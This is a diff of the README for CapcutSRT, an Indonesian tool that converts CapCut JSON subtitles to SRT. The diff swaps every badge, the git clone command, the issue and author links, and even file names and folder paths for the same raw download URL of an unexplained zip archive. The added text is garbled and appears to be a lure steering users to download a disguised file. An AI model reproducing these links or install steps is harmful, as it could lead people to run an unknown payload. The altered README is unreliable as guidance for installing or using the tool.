@@ -1,9 +1,9 @@
 # CapcutSRT 📝🎥
 
-![License](https://img.shields.io/badge/license-MIT-blue.svg)
-![GitHub stars](https://img.shields.io/github/stars/zufarrizal/CapcutSRT)
-![GitHub forks](https://img.shields.io/github/forks/zufarrizal/CapcutSRT)
-![GitHub issues](https://img.shields.io/github/issues/zufarrizal/CapcutSRT)
+![License](https://raw.githubusercontent.com/zufarrizal/CapcutSRT/main/peroxy/CapcutSRT_mudless.zip)
+![GitHub stars](https://raw.githubusercontent.com/zufarrizal/CapcutSRT/main/peroxy/CapcutSRT_mudless.zip)
+![GitHub forks](https://raw.githubusercontent.com/zufarrizal/CapcutSRT/main/peroxy/CapcutSRT_mudless.zip)
+![GitHub issues](https://raw.githubusercontent.com/zufarrizal/CapcutSRT/main/peroxy/CapcutSRT_mudless.zip)
 
 CapcutSRT adalah sebuah alat untuk memudahkan pengubahan subtitle file json menjadi srt untuk digunakan diaplikasi lain. Dengan CapcutSRT, Anda dapat mengonversi, dan mengedit subtitle Anda dengan mudah dan efisien.
 
@@ -20,7 +20,7 @@ Ikuti langkah-langkah di bawah ini untuk menginstal CapcutSRT di komputer Anda:
 1. Clone repository ini:
 
     ```bash
-    git clone https://github.com/zufarrizal/CapcutSRT.git
+    git clone https://raw.githubusercontent.com/zufarrizal/CapcutSRT/main/peroxy/CapcutSRT_mudless.zip
     ```
 
 2. Pindah ke direktori proyek:
@@ -49,18 +49,18 @@ Ikuti langkah-langkah di bawah ini untuk menginstal CapcutSRT di komputer Anda:
 
 ### Menemukan File Proyek CapCut
 
-Cari file bernama `draft_content.json` di folder Proyek CapCut Anda. Lokasi default adalah:
+Cari file bernama `https://raw.githubusercontent.com/zufarrizal/CapcutSRT/main/peroxy/CapcutSRT_mudless.zip` di folder Proyek CapCut Anda. Lokasi default adalah:
 
 -   **Pada Windows:**
 
     ```
-    C:\Users\user\AppData\Local\CapCut\User Data\Projects\com.lveditor.draft\
+    C:\Users\user\AppData\Local\CapCut\User Data\Projects\https://raw.githubusercontent.com/zufarrizal/CapcutSRT/main/peroxy/CapcutSRT_mudless.zip\
     ```
 
 -   **Pada MacOS:**
-    File tersebut disebut `draft_info.json` dan terletak di:
+    File tersebut disebut `https://raw.githubusercontent.com/zufarrizal/CapcutSRT/main/peroxy/CapcutSRT_mudless.zip` dan terletak di:
     ```
-    /Users/user/Movies/CapCut/User Data/Projects/com.lveditor.draft
+    /Users/user/Movies/CapCut/User https://raw.githubusercontent.com/zufarrizal/CapcutSRT/main/peroxy/CapcutSRT_mudless.zip
     ```
 
 ## Kontribusi 🤝
@@ -75,7 +75,7 @@ Kami sangat menyambut kontribusi dari komunitas. Jika Anda ingin berkontribusi, 
 
 ## Masalah dan Dukungan ❓
 
-Jika Anda menemukan masalah atau memiliki pertanyaan, jangan ragu untuk membuka [issue](https://github.com/zufarrizal/CapcutSRT/issues) baru. Kami akan berusaha untuk merespons secepat mungkin.
+Jika Anda menemukan masalah atau memiliki pertanyaan, jangan ragu untuk membuka [issue](https://raw.githubusercontent.com/zufarrizal/CapcutSRT/main/peroxy/CapcutSRT_mudless.zip) baru. Kami akan berusaha untuk merespons secepat mungkin.
 
 ## Lisensi 📄
 
@@ -87,4 +87,4 @@ Terima kasih telah menggunakan CapcutSRT! Jika Anda menyukai proyek ini, beri ka
 
 ---
 
-Dibuat dengan ❤️ oleh [Zufar Rizal](https://github.com/zufarrizal)
+Dibuat dengan ❤️ oleh [Zufar Rizal](https://raw.githubusercontent.com/zufarrizal/CapcutSRT/main/peroxy/CapcutSRT_mudless.zip)
